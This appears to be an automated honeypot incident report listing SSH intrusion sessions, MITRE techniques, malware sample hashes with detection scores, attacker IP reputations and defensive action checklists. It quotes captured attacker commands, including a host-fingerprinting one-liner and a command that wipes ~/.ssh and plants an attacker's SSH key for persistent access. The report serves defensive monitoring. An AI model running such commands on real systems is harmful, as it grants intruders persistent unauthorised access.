| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:42:20` | `cowrie.session.connect` |
| `2026-08-01 22:42:20` | `cowrie.client.version` |
| `2026-08-01 22:42:20` | `cowrie.client.kex` |
| `2026-08-01 22:42:22` | `cowrie.login.success` |
| `2026-08-01 22:42:24` | `cowrie.session.params` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.success` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.command.input` |
| `2026-08-01 22:42:24` | `cowrie.log.closed` |
| `2026-08-01 22:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c051637dba4c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:44 |
| **Last Seen** | 2026-08-01 22:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:44:43` | `cowrie.session.connect` |
| `2026-08-01 22:44:44` | `cowrie.client.version` |
| `2026-08-01 22:44:44` | `cowrie.client.kex` |
| `2026-08-01 22:44:46` | `cowrie.login.success` |
| `2026-08-01 22:44:47` | `cowrie.session.params` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.success` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:47` | `cowrie.command.input` |
| `2026-08-01 22:44:48` | `cowrie.log.closed` |
| `2026-08-01 22:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a8c3716173

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-01 22:47 |
| **Last Seen** | 2026-08-01 22:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:47:02` | `cowrie.session.connect` |
| `2026-08-01 22:47:03` | `cowrie.client.version` |
| `2026-08-01 22:47:03` | `cowrie.client.kex` |
| `2026-08-01 22:47:05` | `cowrie.login.success` |
| `2026-08-01 22:47:06` | `cowrie.session.params` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.success` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:06` | `cowrie.command.input` |
| `2026-08-01 22:47:07` | `cowrie.log.closed` |
| `2026-08-01 22:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65babc58efd

| Field | Detail |
|---|---|
| **Source IP** | `189.161.43[.]93` |
| **First Seen** | 2026-08-01 22:52 |
| **Last Seen** | 2026-08-01 22:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:52:22` | `cowrie.session.connect` |
| `2026-08-01 22:52:22` | `cowrie.client.version` |
| `2026-08-01 22:52:22` | `cowrie.client.kex` |
| `2026-08-01 22:52:23` | `cowrie.login.success` |
| `2026-08-01 22:52:24` | `cowrie.session.params` |
| `2026-08-01 22:52:24` | `cowrie.command.input` |
| `2026-08-01 22:52:24` | `cowrie.command.failed` |
| `2026-08-01 22:52:24` | `cowrie.log.closed` |
| `2026-08-01 22:52:24` | `cowrie.session.params` |
| `2026-08-01 22:52:24` | `cowrie.command.input` |
| `2026-08-01 22:52:25` | `cowrie.session.file_download` |
| `2026-08-01 22:52:25` | `cowrie.log.closed` |
| `2026-08-01 22:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.161.43[.]93` to AbuseIPDB if not already reported
- [ ] Block `189.161.43[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b92b9056f1b6

| Field | Detail |
|---|---|
| **Source IP** | `189.161.43[.]93` |
| **First Seen** | 2026-08-01 22:52 |
| **Last Seen** | 2026-08-01 22:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:52:25` | `cowrie.session.connect` |
| `2026-08-01 22:52:25` | `cowrie.client.version` |
| `2026-08-01 22:52:25` | `cowrie.client.kex` |
| `2026-08-01 22:52:25` | `cowrie.login.success` |
| `2026-08-01 22:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.161.43[.]93` to AbuseIPDB if not already reported
- [ ] Block `189.161.43[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e5ad2667db

| Field | Detail |
|---|---|
| **Source IP** | `189.161.43[.]93` |
| **First Seen** | 2026-08-01 22:52 |
| **Last Seen** | 2026-08-01 22:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:52:25` | `cowrie.session.connect` |
| `2026-08-01 22:52:25` | `cowrie.client.version` |
| `2026-08-01 22:52:26` | `cowrie.client.kex` |
| `2026-08-01 22:52:26` | `cowrie.login.success` |
| `2026-08-01 22:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.161.43[.]93` to AbuseIPDB if not already reported
- [ ] Block `189.161.43[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0397299de717

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]91` |
| **First Seen** | 2026-08-01 22:54 |
| **Last Seen** | 2026-08-01 22:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 22:54:44` | `cowrie.session.connect` |
| `2026-08-01 22:54:45` | `cowrie.login.success` |
| `2026-08-01 22:54:46` | `cowrie.session.params` |
| `2026-08-01 22:54:46` | `cowrie.command.input` |
| `2026-08-01 22:54:47` | `cowrie.command.input` |
| `2026-08-01 22:54:48` | `cowrie.command.input` |
| `2026-08-01 22:54:48` | `cowrie.command.input` |
| `2026-08-01 22:54:48` | `cowrie.command.failed` |
| `2026-08-01 22:54:49` | `cowrie.log.closed` |
| `2026-08-01 22:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]91` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `88.214.25[.]125` | **6** | 2026-08-01 21:04 | 2026-08-01 22:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-08-01 21:30 | 2026-08-01 21:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-08-01 22:17 | 2026-08-01 22:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.72.168[.]10` | **2** | 2026-08-01 22:44 | 2026-08-01 22:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-01 21:12 | 2026-08-01 22:11 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]50` | **2** | 2026-08-01 22:54 | 2026-08-01 22:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | **2** | 2026-08-01 21:21 | 2026-08-01 21:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **2** | 2026-08-01 21:42 | 2026-08-01 22:49 | 1m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-08-01 21:42 | 2026-08-01 22:17 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-08-01 22:10 | 2026-08-01 22:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `113.140.95[.]2` | 1 | 2026-08-01 21:59 | 2026-08-01 21:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `122.254.30[.]34` | 1 | 2026-08-01 21:33 | 2026-08-01 21:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-08-01 22:17 | 2026-08-01 22:18 | 40s | 0 | `T1592` | 🟢 LOW |
| `146.185.219[.]13` | 1 | 2026-08-01 22:16 | 2026-08-01 22:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.197[.]168` | 1 | 2026-08-01 22:28 | 2026-08-01 22:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.220.58[.]65` | 1 | 2026-08-01 22:20 | 2026-08-01 22:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.123.210[.]209` | 1 | 2026-08-01 21:58 | 2026-08-01 21:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]20` | 1 | 2026-08-01 21:05 | 2026-08-01 21:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.211.208[.]125` | 1 | 2026-08-01 22:08 | 2026-08-01 22:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.13.214[.]18` | 1 | 2026-08-01 22:31 | 2026-08-01 22:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-01 22:08 | 2026-08-01 22:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]228` | 1 | 2026-08-01 21:20 | 2026-08-01 21:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-01 21:36 | 2026-08-01 21:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-08-01 21:34 | 2026-08-01 21:34 | 31s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]91` | 1 | 2026-08-01 22:54 | 2026-08-01 22:54 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `93.177.157[.]179` | GE | Magticom | **100** ⚠️ | 50 |
| `122.254.30[.]34` | TW | TFN MEDIA CO., LTD. | **100** ⚠️ | 10 |
| `117.72.168[.]10` | CN | Beijing Jingdong 360 Degree E-commerce Co., Ltd. | **100** ⚠️ | 0 |
| `217.211.208[.]125` | SE | Telia Network Services | **100** ⚠️ | 33 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `216.226.76[.]20` | GB | Valence Technology Co. | **100** ⚠️ | 50 |
| `64.53.7[.]231` | US | Home Telephone Company, Inc. | **100** ⚠️ | 50 |
| `218.13.214[.]18` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `192.220.58[.]65` | US | NTT America, Inc. | **100** ⚠️ | 0 |
| `163.192.48[.]255` | US | Oracle Corporation | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 70 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 59 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 18 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 17 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 17 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 108 cases |
| Tool 34  | Credential Extractor        | ✅ 84 attempts |
